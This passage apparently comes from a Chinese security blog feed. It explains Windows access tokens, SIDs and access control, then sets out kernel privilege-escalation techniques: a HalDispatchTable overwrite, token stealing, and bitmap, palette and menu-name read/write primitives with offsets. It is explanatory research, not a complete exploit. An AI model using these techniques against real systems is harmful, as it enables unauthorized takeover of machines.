输入账号密码"></p></li></ul><h3><span id="pwindows-token-guan-li">Windows token 管理</span><a href="#pwindows-token-guan-li" class="header-anchor">#</a></h3><p>Windows Token即Access Token(访问令牌)，不同的用户登录计算机后会生成一个Access Token，token在用户创建进程或线程时会进行拷贝和分配。</p><p>Windows Access Token主要组成</p><ul><li>用户账户的SID；</li><li>用户所属组的SID；</li><li>登陆SID，标识当前登陆会话；</li><li>用户和用户组特权列表；</li><li>用户创建的进程的默认DACL；</li><li>access token类型和来源；</li><li>其他信息；</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !process 81464da8 1</span><br><span class="line">PROCESS 81464da8  SessionId: 0  Cid: 03bc    Peb: 7ffdf000  ParentCid: 0124</span><br><span class="line">    DirBase: 0dec2000  ObjectTable: e1a31198  TableSize: 275.</span><br><span class="line">    Image: MSMSGS.EXE</span><br><span class="line">    VadRoot 81468cc0 Vads 170 Clone 0 Private 455. Modified 413. Locked 0.</span><br><span class="line">    DeviceMap e1958438</span><br><span class="line">    Token                             e1bed030</span><br><span class="line">    ElapsedTime                       0:44:15.0142</span><br><span class="line">    UserTime                          0:00:00.0290</span><br><span class="line">    KernelTime                        0:00:00.0300</span><br><span class="line">    QuotaPoolUsage[PagedPool]         49552</span><br><span class="line">    QuotaPoolUsage[NonPagedPool]      10872</span><br><span class="line">    Working Set Sizes (now,min,max)  (781, 50, 345) (3124KB, 200KB, 1380KB)</span><br><span class="line">    PeakWorkingSetSize                1550</span><br><span class="line">    VirtualSize                       57 Mb</span><br><span class="line">    PeakVirtualSize                   57 Mb</span><br><span class="line">    PageFaultCount                    2481</span><br><span class="line">    MemoryPriority                    BACKGROUND</span><br><span class="line">    BasePriority                      8</span><br><span class="line">    CommitCharge                      2497</span><br><span class="line">kd&gt; !exts.token -n e1bed030</span><br><span class="line">_TOKEN e1bed030</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-21-518066528-515770016-299552555-2981724 (User: MYDOMAIN\myuser)</span><br><span class="line">Groups:</span><br><span class="line"> 00 S-1-5-21-518066528-515770016-299552555-513 (Group: MYDOMAIN\Domain Users)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 01 S-1-1-0 (Well Known Group: localhost\Everyone)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 02 S-1-5-32-544 (Alias: BUILTIN\Administrators)</span><br><span class="line">    Attributes - Mandatory Default Enabled Owner</span><br><span class="line"> 03 S-1-5-32-545 (Alias: BUILTIN\Users)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 04 S-1-5-21-518066528-515770016-299552555-2999049 (Group: MYDOMAIN\AllUsers)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 05 S-1-5-21-518066528-515770016-299552555-2931095 (Group: MYDOMAIN\SomeGroup1)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 06 S-1-5-21-518066528-515770016-299552555-2931096 (Group: MYDOMAIN\SomeGroup2)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 07 S-1-5-21-518066528-515770016-299552555-3014318 (Group: MYDOMAIN\SomeGroup3)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 08 S-1-5-21-518066528-515770016-299552555-3053352 (Group: MYDOMAIN\Another Group)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 09 S-1-5-21-518066528-515770016-299552555-2966661 (Group: MYDOMAIN\TestGroup)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 10 S-1-5-21-2117033040-537160606-1609722162-17637 (Group: MYOTHERDOMAIN\someusers)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 11 S-1-5-21-518066528-515770016-299552555-3018354 (Group: MYDOMAIN\TestGroup2)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 12 S-1-5-21-518066528-515770016-299552555-3026602 (Group: MYDOMAIN\SomeGroup4)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 13 S-1-5-21-518066528-515770016-299552555-2926570 (Group: MYDOMAIN\YetAnotherGroup)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 14 S-1-5-21-661411660-2927047998-133698966-513 (Group: MYDOMAIN\Domain Users)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 15 S-1-5-21-518066528-515770016-299552555-2986081 (Alias: MYDOMAIN\an_alias)</span><br><span class="line">    Attributes - Mandatory Default Enabled GroupResource</span><br><span class="line"> 16 S-1-5-21-518066528-515770016-299552555-3037986 (Alias: MYDOMAIN\AReallyLongGroupName1)</span><br><span class="line">    Attributes - Mandatory Default Enabled GroupResource</span><br><span class="line"> 17 S-1-5-21-518066528-515770016-299552555-3038991 (Alias: MYDOMAIN\AReallyLongGroupName2)</span><br><span class="line">    Attributes - Mandatory Default Enabled GroupResource</span><br><span class="line"> 18 S-1-5-21-518066528-515770016-299552555-3037999 (Alias: MYDOMAIN\AReallyLongGroupName3)</span><br><span class="line">    Attributes - Mandatory Default Enabled GroupResource</span><br><span class="line"> 19 S-1-5-21-518066528-515770016-299552555-3038983 (Alias: MYDOMAIN\AReallyReallyLongGroupName)</span><br><span class="line">    Attributes - Mandatory Default Enabled GroupResource</span><br><span class="line"> 20 S-1-5-5-0-71188 (no name mapped)</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId</span><br><span class="line"> 21 S-1-2-0 (Well Known Group: localhost\LOCAL)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 22 S-1-5-4 (Well Known Group: NT AUTHORITY\INTERACTIVE)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line"> 23 S-1-5-11 (Well Known Group: NT AUTHORITY\Authenticated Users)</span><br><span class="line">    Attributes - Mandatory Default Enabled</span><br><span class="line">Primary Group: S-1-5-21-518066528-515770016-299552555-513 (Group: MYDOMAIN\Domain Users)</span><br><span class="line">Privs:</span><br><span class="line"> 00 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default</span><br><span class="line"> 01 0x000000008 SeSecurityPrivilege               Attributes -</span><br><span class="line"> 02 0x000000011 SeBackupPrivilege                 Attributes -</span><br><span class="line"> 03 0x000000012 SeRestorePrivilege                Attributes -</span><br><span class="line"> 04 0x00000000c SeSystemtimePrivilege             Attributes -</span><br><span class="line"> 05 0x000000013 SeShutdownPrivilege               Attributes -</span><br><span class="line"> 06 0x000000018 SeRemoteShutdownPrivilege         Attributes -</span><br><span class="line"> 07 0x000000009 SeTakeOwnershipPrivilege          Attributes -</span><br><span class="line"> 08 0x000000014 SeDebugPrivilege                  Attributes -</span><br><span class="line"> 09 0x000000016 SeSystemEnvironmentPrivilege      Attributes -</span><br><span class="line"> 10 0x00000000b SeSystemProfilePrivilege          Attributes -</span><br><span class="line"> 11 0x00000000d SeProfileSingleProcessPrivilege   Attributes -</span><br><span class="line"> 12 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes -</span><br><span class="line"> 13 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled</span><br><span class="line"> 14 0x00000000f SeCreatePagefilePrivilege         Attributes -</span><br><span class="line"> 15 0x000000005 SeIncreaseQuotaPrivilege          Attributes -</span><br><span class="line"> 16 0x000000019 SeUndockPrivilege                 Attributes - Enabled</span><br><span class="line"> 17 0x00000001c SeManageVolumePrivilege           Attributes -</span><br><span class="line">Authentication ID:         (0,11691)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x9 ( Token in use )</span><br><span class="line">Token ID: 18296            ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 18298)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 00000000</span><br></pre></td></tr></table></figure><p><strong>按完整性高低可以分为四类</strong>：</p><ul><li>System：对应 SYSTEM 用户拥有的最高权限，系统进程以 SYSTEM 用户启动，拿到 System 令牌</li><li>High：对应 Administrators 组拥有的最高权限，用来管理计算机，可以修改其他用户，可以修改系统的设置</li><li>Medium：对应 Users 组拥有的最高权限，用于日常使用</li><li>Low：为了更小权限而设置的，例如IE使用该权限启动网页，避免恶意攻击对本地资源产生过多影响</li></ul><p><strong>细看不同账户区别</strong>：</p><p>管理员账户，如果启动一个普通进程，那么此进程在管理员账户下运行，获得的是 Medium 访问令牌。当此进程提升权限，将弹出 UAC 提示框，用户同意后继续使用此同一个管理员账户运行，但子进程将获得 High 访问令牌。</p><p>标准账户，如果启动一个普通进程，那么此进程在标准账户下运行，获得的是 Medium 访问令牌。当此进程提升权限，将弹出 UAC 提示框，用户输入管理员账号密码后，子进程将在输入的管理员账户下运行，获得此管理员的 High 访问令牌</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031325.gif" alt="uac 体系结构"></p><h3><span id="pan-quan-biao-shi-fu-sid">安全标识符SID</span><a href="#pan-quan-biao-shi-fu-sid" class="header-anchor">#</a></h3><p>SID用于唯一标识安全主体或安全组</p><p>SID永远都是唯一的，由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定，以保证它的唯一性</p><p>每个帐户或组，或在帐户的安全上下文中运行的进程都有唯一SID，存储在安全数据库中，当 SID 用作用户或组的唯一标识符时，它永远不会再次用于标识其他用户或组。</p><p>本地帐户或组的 SID 由计算机上本地安全机构 (LSA) 生成，并与其他帐户信息一起存储在注册表的安全区域中。 域帐户或组的 SID 由域安全机构生成，并存储为 Active Directory 域服务中的 User 或 Group 对象的属性。</p><p>用户每次登录时，系统会为该用户创建访问令牌。 访问令牌包含用户的 SID、用户权限以及用户所属的任何组的 SID。 此令牌为用户在此计算机上执行的任何操作提供安全上下文。</p><p>对于每个本地帐户和组，SID 对于创建它的计算机是唯一的。 计算机上没有任何两个帐户或组共享同一 SID。 同样，对于每个域帐户和组，SID 在企业中是唯一的。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031342.gif" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SID &#123;</span><br><span class="line">  UCHAR  Revision; &#x2F;&#x2F; 标识SID版本</span><br><span class="line">  UCHAR  SubAuthorityCount; </span><br><span class="line">  SID_IDENTIFIER_AUTHORITY  IdentifierAuthority; &#x2F;&#x2F;最高级别签发机构</span><br><span class="line">  ULONG  SubAuthority[ANYSIZE_ARRAY]; &#x2F;&#x2F;中间签发者</span><br><span class="line">&#125; SID, *PISID;</span><br></pre></td></tr></table></figure><h3><span id="pfang-wen-ling-pai">访问令牌</span><a href="#pfang-wen-ling-pai" class="header-anchor">#</a></h3><p>有两种类型的访问令牌，即主令牌和模拟令牌。 每个进程都有一个主令牌，用于描述与进程关联的用户帐户的安全上下文。 通常会将主访问令牌分配给一个进程，以表示该进程的默认安全信息。 另一方面，模拟令牌通常用于客户端和服务器方案。 模拟令牌使线程在不同于拥有该线程的进程的安全上下文的安全上下文中运行。</p><p>过程：</p><ol><li><p>当用户以交互方式登录或尝试与运行 Windows 的计算机建立网络连接时，登录过程会对用户凭据进行身份验证。 如果身份验证成功，此过程将返回用户的 SID 和用户的安全组的 SID 列表。</p></li><li><p>计算机上本地安全 (LSA) 使用此信息创建访问令牌 (在这种情况下，主访问令牌) 。 这包括登录过程返回的 ID 以及本地安全策略分配给用户和用户的安全组的用户权限列表</p></li><li><p>LSA 创建主访问令牌后，访问令牌的副本将附加到代表用户执行的每一个线程和进程。 每当线程或进程与安全对象交互或尝试执行需要用户权限的系统任务时，操作系统都会检查与该线程关联的访问令牌以确定授权级别。</p></li></ol><h3><span id="pan-quan-miao-shu-fu">安全描述符</span><a href="#pan-quan-miao-shu-fu" class="header-anchor">#</a></h3><p>安全描述符是一种与每个安全对象关联的数据结构。 Active Directory 中的所有对象以及本地计算机或网络上的所有安全对象都有安全描述符，以帮助控制对对象的访问。</p><p>安全描述符包括有关谁拥有对象、谁可以访问该对象以及以什么方式访问以及审核哪些类型的访问的信息</p><p>分为DACL和SACL：</p><ul><li>选择访问控制列表DACL：用于标识允许或拒绝访问的用户和组</li><li>系统访问控制列表SACL：用于控制如何审核访问权限</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SECURITY_DESCRIPTOR &#123;</span><br><span class="line">   UCHAR Revision;</span><br><span class="line">   UCHAR Sbz1;</span><br><span class="line">   SECURITY_DESCRIPTOR_CONTROL Control;</span><br><span class="line">   PSID Owner;                           &#x2F;&#x2F;</span><br><span class="line">   PSID Group;</span><br><span class="line">   PACL Sacl;                           &#x2F;&#x2F;系统访问控制列表，是用来做审计用的，一般不用关心</span><br><span class="line">   PACL Dacl;                           &#x2F;&#x2F;自主访问控制列表，记录了哪些用户可以(&#x2F;不可以)以何种方式访问该对象</span><br><span class="line">   &#125; SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>每个ACL都由一系列ACE元素组成，ACE中包含以下信息：</p><p>1、谁对你有权限<br>2、是允许还是拒绝<br>3、有什么权限<br>4、这个权限能不能被继承</p><h3><span id="pshou-quan-he-fang-wen-kong-zhi-guo-cheng">授权和访问控制过程</span><a href="#pshou-quan-he-fang-wen-kong-zhi-guo-cheng" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031421.gif" alt="授权和访问控制过程"></p><p>当进程打开一个对象时，会从进程token中获取用户名和用户所在组列表，与对象安全描述符的中的DACL比较</p><ul><li>对象的DACL==Null，则进程拥有完全的访问权限。</li><li>对象的DACL不为Null，但是AceCount ==0（ACE,访问控制项），则拒绝任何进程访问。</li><li>遍历DACL，找到跟令牌中用户或组一致的Ace，如果该Ace指明没有拥有制定的访问权限，则直接退出安全检查函数，并拒绝该进程访问。</li><li>遍历DACL，没找到跟令牌中用户或组一致的Ace，并拒绝该进程访问。</li><li>遍历DACL，找到跟令牌中用户或组一致的Ace，如果该Ace指明拥有制定的访问权限，则直接退出安全检查函数，并允许该进程访问。</li></ul><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/">https://docs.microsoft.com/zh-cn/windows/security/identity-protection/</a></li><li><a href="http://www.youngroe.com/2015/08/14/Windows/Windows-Permissions-Privilege/">http://www.youngroe.com/2015/08/14/Windows/Windows-Permissions-Privilege/</a></li><li><a href="https://blog.csdn.net/Ga4ra/article/details/102509417">https://blog.csdn.net/Ga4ra/article/details/102509417</a></li><li><a href="https://www.cnblogs.com/guomeiran/p/4152857.html">https://www.cnblogs.com/guomeiran/p/4152857.html</a></li><li><a href="https://blog.walterlv.com/post/windows-user-account-control.html">https://blog.walterlv.com/post/windows-user-account-control.html</a></li><li><a href="https://cloud.tencent.com/developer/article/1622153">https://cloud.tencent.com/developer/article/1622153</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/12932451.html">https://www.cnblogs.com/zpchcbd/p/12932451.html</a></li><li><a href="https://github.com/helpsystems/GDIObjDump">https://github.com/helpsystems/GDIObjDump</a></li><li><a href="https://juejin.cn/post/6844903572618887176">https://juejin.cn/post/6844903572618887176</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows提权基础知识</title>
    <url>/2acbaae3.html</url>
    <content><![CDATA[<blockquote><p>调研调研，真的不想再调研了，淦！</p></blockquote><a id="more"></a><h3><span id="phaldispatchtable">HalDispatchTable</span><a href="#phaldispatchtable" class="header-anchor">#</a></h3><blockquote><p>HalDispatchTable作为内核中的一个表，在windows内核提权中十分有用</p></blockquote><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113056.jpg" alt="img"></p><p>因为它是一个存在于内核态的系统调用表，当我们获得任意地址写的能力后，可以使用<code>shellcode</code>地址覆盖偏移为4的函数<code>HalQuerySystemInformation</code>，然后调用<code>NtQueryIntervalProfile</code>函数，即可通过该表调用<code>shellcode</code>，之所以选择覆盖这个函数，是因为它没有什么用，覆盖后不会使内核崩溃</p><p>当漏洞可以获得任意地址写任意值的能力时，可以利用<code>HalDispatchTable</code>进行利用</p><p><strong>利用过程</strong>：</p><ol><li>找ntkrnlpa.exe地址：使用EnumDeviceDrivers函数枚举所有的设备驱动地址，找到名为ntkrnlpa.exe驱动的地址</li><li>计算HalDispatchTable：使用LoadLibraryExA函数加载ntkrnlpa.exe到内存，然后使用GetProcAddress函数获得HalDispatchTable的地址</li><li>覆盖HalQuerySystemInformation地址为shellcode地址</li><li>shellcode替换windows token提权</li></ol><h3><span id="pwindows-token">windows token</span><a href="#pwindows-token" class="header-anchor">#</a></h3><blockquote><p>Windows token是windows下控制进程、线程权限的重要标志</p></blockquote><p>Token和进程相关联， 每个进程创建时都会根据Logon Session权限由LSA（Local Security Authority)分配一个Token(如果CreaeProcess时自己指定了Token, LSA会用该Token， 否则就用父进程Token的一份拷贝,由大部分进程是由Explorer.exe创建， 所以我们大部分时候都复制了explorer.exe的Token)， 里面含有该进程的安全信息，包括用户帐号， 组信息， 权限信息和默认安全描述符(Security Descriptor)等， 我们可以通过GetTokenInformation查询某个Token的详细情况。</p><p>因此，如果我们可以替换当前进程的token为系统权限级token，就获得了提权。</p><p><strong>利用过程</strong>：</p><ol><li>保存当前寄存器状态</li><li>找到当前进程的token并保存</li><li>利用system进程的pid找到system进程的token</li><li>用system进程的token替换当前进程的token</li></ol><p>具体替换代码可参考<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c">payload.c</a></p><p><strong>一些相关的函数</strong>：</p><ul><li>CreateProcess：使用当前登录用户的token创建进程</li><li>CreateProcessAsUser，CreateProcessWithTokenW：以某用户的token创建进程，具体token可以通过LogonUser登录用户账户获得</li><li>OpenProcessToken、 OpenThreadToken：得到当前进程、线程的token</li><li>GetTokenInformation：获取token中的信息</li><li>AdjustTokenPrivileges：修改token改变权限</li></ul><p>具体见微软文档：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDN</a></p><h3><span id="pwindows-10-1607-zhi-qian-bitmap">windows 10 1607之前 —— BitMap</span><a href="#pwindows-10-1607-zhi-qian-bitmap" class="header-anchor">#</a></h3><blockquote><p>BitMap是windows内核利用中一个被经常应用到的结构</p></blockquote><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113110.jpg" alt="alt 2"></p><p>CreateBitMap创建了<code>SURFACE OBJECT</code>，包含结构<code>BASEOBJECT</code>和<code>SURFOBJ</code>，变量<code>pvScan0</code>，其中<code>pvScan0</code>指向内核中的一块数据区域<code>Pixel Data</code></p><p>其中<code>Pixel Data</code>可以使用函数<code>GetBitmapBits</code>和<code>SetBitmapBits</code>进行控制</p><p>因此，如果能够篡改某个(术语 worker bitmap)<code>bitmap</code>的<code>pvScan0</code>的值为任意的值的话, 就能获取向任意地址<code>读</code>和<code>写</code>的权限.</p><p><strong>利用流程：</strong></p><ol><li>调用 CreateBitmap 创建 bitmap 内核对象</li><li>通过 teb 获得 pvScan0 的地址<ol><li>fs 在用户模式下指向 teb，通过 NtCurrentTeb 来获得 teb 的基址</li><li>teb 中的 ProcessEnvironmentBlock 指向线程所在的进程 peb</li><li>peb 偏移 0x094 的地方（x86下）是一个指向 GDICELL 结构体数组的指针 GdiSharedHandleTableAddr</li><li>通过 CreateBitmap 返回的 handle 值可以得到该 bitmap 的 GDICELL 结构体的索引</li><li><code>DWORD32 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD32) handle &amp; 0xffff) * (x86:0x10,x64:0x18);</code>(只对windows 10 1607 前有效)</li><li><code>pKernelAddress</code>指向<code>BASEOBJECT</code>的第一个字节，因此<code>pvScan0 = (PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</code></li></ol></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F; 32bit size: 0x10</span><br><span class="line">&#x2F;&#x2F;&#x2F; 64bit size: 0x18</span><br><span class="line">typedef struct _GDI_CELL</span><br><span class="line">&#123;</span><br><span class="line">    IntPtr pKernelAddress;</span><br><span class="line">    UInt16 wProcessId;</span><br><span class="line">    UInt16 wCount;</span><br><span class="line">    UInt16 wUpper;</span><br><span class="line">    UInt16 wType;</span><br><span class="line">    IntPtr pUserAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>通过任意地址写漏洞改写 pvScan0 的值为想要读/写的地址</li><li>调用 GetBitmapBits /SetBitmapBits来读/写数据</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113118.jpg" alt="alt 9"></p><p>一般通过两个BitMap进行利用：</p><ol><li>创建两个 bitmap，分别为 hManager 和 hWorker</li><li>通过任意地址写漏洞改写 hManager 的 pvScan0 的值为 hWorker 的 pvScan0 的地址</li><li>结合 GetBitmapBits 和 SetBitmapBits，利用 hManager 和 hWorker 读取 system 的 token</li><li>把 system 的 token 赋予我们的当前进程</li></ol><h3><span id="pwindows-10-1607-accelerator-table">windows 10 1607 —— Accelerator table</span><a href="#pwindows-10-1607-accelerator-table" class="header-anchor">#</a></h3><blockquote><p>在<code>windows 10 1607</code>版本中，BitMap的问题被暂时缓解，无法通过之前的<code>pKernelAddress</code>以及一系列偏移计算定位到<code>pvScan0</code>的地址</p></blockquote><p>可以想到的<strong>两个基本思路</strong>：</p><ol><li>寻找其它方法来泄露 bitmap GDI 对象的地址</li><li>寻找 bitmap 的替代方案</li></ol><p>Windows 中存在着 3 种类型的对象，分别为 user object、GDI object、Kernel object，一共有 40 多种对象</p><p>区别：</p><ul><li>Event 对象属于 Kernel object，存在于非换页池中</li><li>bitmap 对象属于 GDI object，存在于换页会话池中</li><li>Accelerator table 对象，属于 user object，也存在于换页会话池中</li></ul><p>由于bitmap对象和Accelerator table都存在于换页会话池，因此可以考虑用Bitmap对象重用故意释放的Accelerator table的空间，也就等同于获得了Bitmap对象的地址</p><p><strong>获得Accelerator table</strong>的地址</p><ul><li>User.dll模块中存在全局变量 gSharedInfo</li><li>gSharedInfo的第二个变量 aheList 指向USER_HANDLE_ENTRY表对象</li><li>USER_HANDLE_ENTRY表对象第一个参数pKernel ，指向该 user object 在内核空间中的位置</li><li>Accelerator table属于 user object ，因此可以找到对应的地址</li></ul><p><strong>让BitMap获得地址</strong>：</p><ul><li>第一种：在池中释放掉一块空间，并且之后分配同等大小的空间时，内存管理器是倾向于分配同一块空间给它</li><li>第二种：通过 pool fengshui 的方法来提高分配的稳定性</li></ul><h3><span id="pwindows-10-1703-lpszmenuname">windows 10 1703 —— lpszMenuName</span><a href="#pwindows-10-1703-lpszmenuname" class="header-anchor">#</a></h3><blockquote><p>和之前一样，微软为了不让找到到<code>pvScan0</code>还是想办法去获得BitMap，禁用了使用USER_HANDLE_ENTRY中的pKernel进行索引的方法</p></blockquote><p>lpszMenuName关联一个window的<code>windows窗口对象</code>, 其在内核当中对应结构体对象为<code>tagWND</code></p><p>tagCLS对应于windows窗口类，其中一个对象是<code>lpszManuName</code></p><p>如果可以泄露<code>lpszManuName</code>地址，就可以通过<code>wndclass.lpszMenuName</code>控制对应内存的大小</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113126.jpg" alt="img"></p><p><code>tagWND</code>对应一个<code>桌面堆</code>. 内核的桌面堆会映射到用户态去. <code>HMValidateHandle</code>能够获取这个映射的地址. 在这个映射(head.pSelf)当中存储着当前<code>tagWND</code>对象的内核地址. 而<code>HMValidateHandle</code>函数的地址未导出, 不过在导出的<code>IsMenu</code>函数有使用, 所以可以通过硬编码的形式找到它.</p><p>因此利用过程如下：</p><ol><li>pIsMenu --&gt; pHMValidateHandle --&gt; pWnd = HMValidateHandle(hWnd,1)，返回tagWND对象指针，用户桌面堆地址</li><li>pSelf=pWnd+0x20，得到内核桌面堆地址</li><li>kernelTagCLS=pWnd+0xa8，得到内核TagCLS地址</li><li>userTagCLS=kernelTagCLS-ulClientDelta，取得用户TagCLS地址，lpszMenuName位于0x90偏移处(该处指向paged pool)</li><li>配一个比较长的窗口窗口菜单名，再释放掉，然后再申请一个Bitmap将会从用刚才释放的块</li></ol><h3><span id="pwindows-10-1707-palette">Windows 10 1707 —— Palette</span><a href="#pwindows-10-1707-palette" class="header-anchor">#</a></h3><blockquote><p>在这个版本，微软意识到BitMap才是问题的根源，于是选择将Bitmap header与Bitmap data部分分离，无法再通过Bitmap header取得pvscan0指针的内核地址</p></blockquote><p>通过分析，大哥们发现Palette的结构完全可以实现之前BitMap的效果，因此选择使用Pallette进行利用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PALETTE64</span><br><span class="line">&#123;</span><br><span class="line">    BASEOBJECT64      BaseObject;    &#x2F;&#x2F; 0x00</span><br><span class="line">    FLONG           flPal;         &#x2F;&#x2F; 0x18</span><br><span class="line">    ULONG32           cEntries;      &#x2F;&#x2F; 0x1C</span><br><span class="line">    ULONG32           ulTime;        &#x2F;&#x2F; 0x20 </span><br><span class="line">    HDC             hdcHead;       &#x2F;&#x2F; 0x24</span><br><span class="line">    ULONG64        hSelected;     &#x2F;&#x2F; 0x28, </span><br><span class="line">    ULONG64           cRefhpal;      &#x2F;&#x2F; 0x30</span><br><span class="line">    ULONG64          cRefRegular;   &#x2F;&#x2F; 0x34</span><br><span class="line">    ULONG64      ptransFore;    &#x2F;&#x2F; 0x3c</span><br><span class="line">    ULONG64      ptransCurrent; &#x2F;&#x2F; 0x44</span><br><span class="line">    ULONG64      ptransOld;     &#x2F;&#x2F; 0x4C</span><br><span class="line">    ULONG32           unk_038;       &#x2F;&#x2F; 0x38</span><br><span class="line">    ULONG64         pfnGetNearest; &#x2F;&#x2F; 0x3c</span><br><span class="line">    ULONG64   pfnGetMatch;   &#x2F;&#x2F; 0x40</span><br><span class="line">    ULONG64           ulRGBTime;     &#x2F;&#x2F; 0x44</span><br><span class="line">    ULONG64       pRGBXlate;     &#x2F;&#x2F; 0x48</span><br><span class="line">    PALETTEENTRY    *pFirstColor;  &#x2F;&#x2F; 0x80</span><br><span class="line">    struct _PALETTE *ppalThis;     &#x2F;&#x2F; 0x88</span><br><span class="line">    PALETTEENTRY    apalColors[3]; &#x2F;&#x2F; 0x90</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>PALETTE偏移0x90处是PALETTEENTRY，相当于BitMap中的pixel Data</li><li>偏移0x80处的pFirstColor是一个指向PALETTEENTRY的指针，相当于BitMap中的pvScan0</li></ul><p><strong>利用</strong>：</p><ul><li>在bitmap中GetBitmapBits、SetBitmapBits用来操纵Pixel Data</li><li>在Palette中，使用GetPaletteEntrie和SetPaletteEntrie操纵PALETTEENTRY</li><li>具体如下图</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113131.jpg" alt="img"></p><h3><span id="ppool-feng-shui">Pool风水</span><a href="#ppool-feng-shui" class="header-anchor">#</a></h3><blockquote><p>有的时候对利用过程中对象的地址并非绝对掌握，但是通过堆风水，可以让这些对象的相对位置确定，通过在内存中布置大量的对象，提高利用的稳定性</p></blockquote><p>具体阅读：<a href="https://xz.aliyun.com/t/3146">https://xz.aliyun.com/t/3146</a></p><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><a href="https://www.cnblogs.com/weiym/p/3280313.html">https://www.cnblogs.com/weiym/p/3280313.html</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap/">https://50u1w4y.github.io/site/HEVD/bitmap/</a></li><li><a href="https://paper.seebug.org/876/">https://paper.seebug.org/876/</a></li><li><a href="https://xz.aliyun.com/t/3430">https://xz.aliyun.com/t/3430</a></li><li><a href="https://www.anquanke.com/post/id/168441">https://www.anquanke.com/post/id/168441</a></li><li><a href="https://bbs.pediy.com/thread-224158.htm">https://bbs.pediy.com/thread-224158.htm</a></li><li><a href="https://xz.aliyun.com/t/3146">https://xz.aliyun.com/t/3146</a></li><li><a href="https://bbs.pediy.com/user-home-530966.htm">https://bbs.pediy.com/user-home-530966.htm</a></li><li><a href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></li><li><a href="https://www.anquanke.com/post/id/168572">https://www.anquanke.com/post/id/168572</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap/">https://50u1w4y.github.io/site/HEVD/bitmap/</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>linux权限管理机制</title>
    <url>/8f72536d.html</url>
